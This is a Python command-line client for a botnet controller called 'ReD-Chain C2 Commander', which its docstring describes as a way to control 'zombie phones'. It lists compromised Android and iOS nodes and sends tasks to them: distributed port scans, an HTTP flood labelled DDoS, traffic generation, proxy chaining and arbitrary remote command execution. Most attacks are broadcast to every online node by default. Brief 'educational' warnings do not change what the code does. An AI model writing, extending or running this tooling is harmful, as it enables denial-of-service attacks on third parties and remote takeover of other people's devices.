#!/usr/bin/env python3
"""
C2 Commander CLI - Control zombie phones
"""
import asyncio
import aiohttp
import json
from typing import List, Dict
from rich.console import Console
from rich.table import Table
from rich import print as rprint
from rich.prompt import Prompt, Confirm
import sys

console = Console()

class C2Commander:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = None

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def get_nodes(self, status=None):
        """Get all registered nodes"""
        url = f"{self.base_url}/api/nodes/"
        if status:
            url += f"?status={status}"

        async with self.session.get(url) as resp:
            if resp.status == 200:
                return await resp.json()
            return []

    async def create_task(self, task_type: str, params: dict, node_ids: List[str] = None):
        """Create task(s) for nodes"""
        tasks_created = []

        if node_ids:
            # Specific nodes
            for node_id in node_ids:
                task_data = {
                    "task_type": task_type,
                    "parameters": params,
                    "assigned_node_id": node_id,
                    "priority": params.get("priority", 5)
                }

                async with self.session.post(
                    f"{self.base_url}/api/tasks/",
                    json=task_data
                ) as resp:
                    if resp.status == 200:
                        tasks_created.append(await resp.json())
        else:
            # Broadcast to all online nodes
            nodes = await self.get_nodes(status="online")
            for node in nodes:
                task_data = {
                    "task_type": task_type,
                    "parameters": params,
                    "assigned_node_id": node["node_id"],
                    "priority": params.get("priority", 5)
                }

                async with self.session.post(
                    f"{self.base_url}/api/tasks/",
                    json=task_data
                ) as resp:
                    if resp.status == 200:
                        tasks_created.append(await resp.json())

        return tasks_created

    async def get_tasks(self, status=None):
        """Get all tasks"""
        url = f"{self.base_url}/api/tasks/"
        if status:
            url += f"?status={status}"

        async with self.session.get(url) as resp:
            if resp.status == 200:
                return await resp.json()
            return []

    def show_nodes(self, nodes):
        """Display nodes in table format"""
        table = Table(title="🤖 Zombie Phones")

        table.add_column("ID", style="cyan")
        table.add_column("Type", style="magenta")
        table.add_column("Device", style="green")
        table.add_column("Status", style="yellow")
        table.add_column("IP", style="blue")
        table.add_column("Tasks", style="white")

        for node in nodes:
            status_emoji = {
                "online": "🟢",
                "offline": "🔴",
                "busy": "🟡",
                "error": "💥"
            }.get(node["status"], "⚪")

            type_emoji = "🤖" if node["node_type"] == "android" else "🍎"

            table.add_row(
                node["node_id"][:8] + "...",
                f"{type_emoji} {node['node_type'].upper()}",
                node["device_name"],
                f"{status_emoji} {node['status']}",
                node.get("ip_address", "N/A"),
                f"✅ {node['total_tasks_completed']} / ❌ {node['total_tasks_failed']}"
            )

        console.print(table)

    def show_tasks(self, tasks):
        """Display tasks in table format"""
        table = Table(title="📋 Tasks")

        table.add_column("Task ID", style="cyan")
        table.add_column("Type", style="magenta")
        table.add_column("Node", style="green")
        table.add_column("Status", style="yellow")
        table.add_column("Priority", style="red")

        for task in tasks:
            status_emoji = {
                "pending": "⏳",
                "assigned": "📤",
                "running": "⚡",
                "completed": "✅",
                "failed": "❌",
                "cancelled": "🚫"
            }.get(task["status"], "⚪")

            table.add_row(
                task["task_id"][:8] + "...",
                task["task_type"],
                task.get("assigned_node_id", "N/A")[:8] + "..." if task.get("assigned_node_id") else "N/A",
                f"{status_emoji} {task['status']}",
                str(task["priority"])
            )

        console.print(table)


async def main_menu():
    """Main CLI menu"""
    async with C2Commander() as commander:
        while True:
            console.clear()
            rprint("[bold red]═══════════════════════════════════════[/bold red]")
            rprint("[bold red]   ReD-Chain C2 Commander[/bold red]")
            rprint("[bold red]   Zombie Phone Control Center[/bold red]")
            rprint("[bold red]═══════════════════════════════════════[/bold red]")
            print()

            rprint("[bold cyan]1.[/bold cyan] 📱 View Nodes")
            rprint("[bold cyan]2.[/bold cyan] 📋 View Tasks")
            rprint("[bold cyan]3.[/bold cyan] 🎯 Port Scan Attack")
            rprint("[bold cyan]4.[/bold cyan] 🌐 HTTP Flood (DDoS)")
            rprint("[bold cyan]5.[/bold cyan] 🔍 DNS Lookup")
            rprint("[bold cyan]6.[/bold cyan] 🌊 Traffic Generation")
            rprint("[bold cyan]7.[/bold cyan] 🔗 Proxy Chain Test")
            rprint("[bold cyan]8.[/bold cyan] 💾 Execute Custom Command")
            rprint("[bold cyan]9.[/bold cyan] 🔄 Update Node Status")
            rprint("[bold red]0.[/bold red] 🚪 Exit")
            print()

            choice = Prompt.ask("Select option", choices=["0","1","2","3","4","5","6","7","8","9"])

            if choice == "0":
                rprint("[bold green]Goodbye! Stay safe! 🛡️[/bold green]")
                break

            elif choice == "1":
                # View nodes
                nodes = await commander.get_nodes()
                console.clear()
                commander.show_nodes(nodes)

                rprint(f"\n[bold green]Total nodes: {len(nodes)}[/bold green]")
                online = len([n for n in nodes if n["status"] == "online"])
                rprint(f"[bold green]Online: {online}[/bold green]")

                input("\nPress Enter to continue...")

            elif choice == "2":
                # View tasks
                tasks = await commander.get_tasks()
                console.clear()
                commander.show_tasks(tasks)

                rprint(f"\n[bold green]Total tasks: {len(tasks)}[/bold green]")
                input("\nPress Enter to continue...")

            elif choice == "3":
                # Port scan attack
                console.clear()
                rprint("[bold red]🎯 Distributed Port Scan[/bold red]\n")

                target = Prompt.ask("Target IP/Domain")
                port_range = Prompt.ask("Port range (e.g., 1-1000)", default="1-1000")

                broadcast = Confirm.ask("Broadcast to ALL online nodes?", default=True)

                start_port, end_port = map(int, port_range.split("-"))

                params = {
                    "target": target,
                    "start_port": start_port,
                    "end_port": end_port,
                    "timeout": 2
                }

                node_ids = None if broadcast else []

                if not broadcast:
                    nodes = await commander.get_nodes(status="online")
                    commander.show_nodes(nodes)
                    node_input = Prompt.ask("Enter node IDs (comma separated)")
                    node_ids = [nid.strip() for nid in node_input.split(",")]

                tasks = await commander.create_task("port_scan", params, node_ids)

                rprint(f"\n[bold green]✅ Created {len(tasks)} port scan tasks![/bold green]")
                input("\nPress Enter to continue...")

            elif choice == "4":
                # HTTP Flood
                console.clear()
                rprint("[bold red]🌐 HTTP Flood Attack (Educational)[/bold red]\n")
                rprint("[yellow]⚠️  Only use on your own infrastructure![/yellow]\n")

                target_url = Prompt.ask("Target URL")
                duration = int(Prompt.ask("Duration (seconds)", default="10"))
                requests_per_sec = int(Prompt.ask("Requests per second (per node)", default="10"))

                broadcast = Confirm.ask("Broadcast to ALL online nodes?", default=True)

                params = {
                    "target_url": target_url,
                    "duration": duration,
                    "requests_per_second": requests_per_sec,
                    "method": "GET"
                }

                node_ids = None if broadcast else []

                if not broadcast:
                    nodes = await commander.get_nodes(status="online")
                    commander.show_nodes(nodes)
                    node_input = Prompt.ask("Enter node IDs (comma separated)")
                    node_ids = [nid.strip() for nid in node_input.split(",")]

                tasks = await commander.create_task("traffic_gen", params, node_ids)

                rprint(f"\n[bold green]✅ Created {len(tasks)} traffic gen tasks![/bold green]")
                input("\nPress Enter to continue...")

            elif choice == "5":
                # DNS Lookup
                console.clear()
                rprint("[bold cyan]🔍 Distributed DNS Lookup[/bold cyan]\n")

                domain = Prompt.ask("Domain name")

                params = {
                    "domain": domain,
                    "record_type": "A"
                }

                tasks = await commander.create_task("custom", params)

                rprint(f"\n[bold green]✅ Created {len(tasks)} DNS lookup tasks![/bold green]")
                input("\nPress Enter to continue...")

            elif choice == "6":
                # Traffic generation
                console.clear()
                rprint("[bold yellow]🌊 Network Traffic Generation[/bold yellow]\n")

                target = Prompt.ask("Target URL")
                duration = int(Prompt.ask("Duration (seconds)", default="60"))

                params = {
                    "target_url": target,
                    "duration": duration,
                    "requests_per_second": 5
                }

                tasks = await commander.create_task("traffic_gen", params)

                rprint(f"\n[bold green]✅ Created {len(tasks)} traffic gen tasks![/bold green]")
                input("\nPress Enter to continue...")

            elif choice == "7":
                # Proxy chain
                console.clear()
                rprint("[bold magenta]🔗 Proxy Chain Test[/bold magenta]\n")

                test_url = Prompt.ask("Test URL", default="http://httpbin.org/ip")

                params = {
                    "test_url": test_url,
                    "chain_length": 3
                }

                tasks = await commander.create_task("proxy_request", params)

                rprint(f"\n[bold green]✅ Created {len(tasks)} proxy tasks![/bold green]")
                input("\nPress Enter to continue...")

            elif choice == "8":
                # Custom command
                console.clear()
                rprint("[bold red]💾 Execute Custom Command[/bold red]\n")
                rprint("[yellow]⚠️  Be careful with custom commands![/yellow]\n")

                command = Prompt.ask("Command to execute")

                params = {
                    "command": command
                }

                broadcast = Confirm.ask("Broadcast to ALL online nodes?", default=False)

                node_ids = None if broadcast else []

                if not broadcast:
                    nodes = await commander.get_nodes(status="online")
                    commander.show_nodes(nodes)
                    node_input = Prompt.ask("Enter node IDs (comma separated)")
                    node_ids = [nid.strip() for nid in node_input.split(",")]

                tasks = await commander.create_task("execute_command", params, node_ids)

                rprint(f"\n[bold green]✅ Created {len(tasks)} command execution tasks![/bold green]")
                input("\nPress Enter to continue...")

            elif choice == "9":
                # Update status
                nodes = await commander.get_nodes()
                console.clear()
                commander.show_nodes(nodes)
                input("\nPress Enter to continue...")


if __name__ == "__main__":
    try:
        asyncio.run(main_menu())
    except KeyboardInterrupt:
        print("\n\nExiting...")
        sys.exit(0)
